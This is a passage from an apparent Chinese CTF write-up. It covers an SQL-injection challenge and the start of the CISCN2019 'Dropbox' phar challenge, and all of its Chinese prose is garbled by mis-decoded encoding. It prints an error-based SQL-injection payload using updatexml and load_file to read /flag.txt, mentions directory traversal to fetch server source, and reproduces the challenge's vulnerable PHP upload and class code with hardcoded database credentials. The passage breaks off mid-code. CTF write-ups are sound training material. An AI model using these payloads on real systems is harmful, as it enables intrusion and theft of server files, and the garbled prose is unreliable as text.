alt="cyber11"></p><p>æˆ‘ä»¬å¹¶æ²¡æœ‰æ›´æ”¹<code>2</code>çš„åœ°å€ä½†ä¹Ÿå›æ˜¾äº†<code>ctfusers</code>ï¼Œå…¶å®å°±æ˜¯åˆšæ‰åœ¨ä¿®æ”¹æ—¶æŠŠ<code>user</code>è¡¨ä¸­æ‰€æœ‰<code>address</code>å­—æ®µçš„å€¼éƒ½è®¾ç½®äº†ã€‚</p><p>åé¢å°±ç®€å•äº†ï¼Œçˆ†åº“çˆ†è¡¨çˆ†åˆ—çˆ†å­—æ®µï¼Œä¸è¿‡è¿™é¢˜å®˜æ–¹å½“æ—¶æ˜¯ç»™äº†hintçš„ï¼Œå°±æ˜¯<code>flag</code>åœ¨<code>flag.txt</code>ä¸­ï¼Œæˆ‘ä»¬ç”¨<code>load_file</code>ç›´æ¥è¯»<code>/flag.txt</code>ä¸­çš„å†…å®¹ï¼š</p><p><img src="/img/cyber12.png" alt="cyber12"></p><p><img src="/img/cyber13.png" alt="cyber13"></p><p>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯ç½‘ä¸Šå¾ˆå¤šäººç”¨çš„ï¼Œåˆ©ç”¨æŠ¥é”™è¿›è¡Œå›æ˜¾ï¼š</p><p><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</code></p><p>æ³¨å†Œçš„æ—¶å€™å°±è¾“å…¥<code>payload</code>ï¼Œç„¶åéšä¾¿ä¿®æ”¹ä¸€ä¸ªå¯¹åº”çš„åœ°å€ï¼š</p><p><img src="/img/cyber14.png" alt="cyber14"></p><p>æŸ¥è¯¢è®¢å•è®¢å•æ—¶å€™æŸ¥å‡ºæ¥çš„å…¶å®å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œä¸è¿‡å› ä¸ºè¢«è½¬ä¹‰äº†æ‰€ä»¥æ²¡å•¥å½±å“ï¼š</p><p><img src="/img/cyber16.png" alt="cyber16"></p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>æç¤º<code>php phar</code></p><p><img src="/img/dropbox1.png" alt="dropbox1"></p><p>å…ˆæ³¨å†Œä¸€ä¸ªç™»å½•çœ‹çœ‹</p><p>ä¸Šä¼ åŠŸèƒ½ï¼Œä¸è¿‡æ˜¯å¦æœ‰è¿‡æ»¤ä¸æ¸…æ¥šï¼Œæˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶(åªå…è®¸ä¸Šä¼ å›¾ç‰‡å½¢å¼çš„):</p><p><img src="/img/dropbox4.png" alt="dropbox4"></p><p>ä¸Šä¼ åæä¾›äº†ä¸‹è½½åŠŸèƒ½ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹ï¼š</p><p><img src="/img/dropbox3.png" alt="dropbox3"></p><p>å…¶å®å¦‚æœåšè¿™ç§<code>phar</code>çš„é¢˜æœ€å¥½èƒ½æ‹¿åˆ°æºç ï¼Œå°è¯•ä¸‹è½½<code>upload.php</code>çœ‹çœ‹ï¼š</p><p>(åˆ©ç”¨ç›®å½•ç©¿è¶Šå¤šè¯•å‡ æ¬¡)</p><p><img src="/img/dropbox6.png" alt="dropbox6"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>])) &#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$pos</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/gif&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/jpeg&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/png&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Only gif/jpg/png allowed&quot;</span>);<br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>            <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$dst</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>] . <span class="hljs-variable">$filename</span> . <span class="hljs-variable">$fileext</span>;<br>        <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$dst</span>);<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Invaild filename&quot;</span>);<br>        <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;dropbox&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();<br>        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$expect</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; 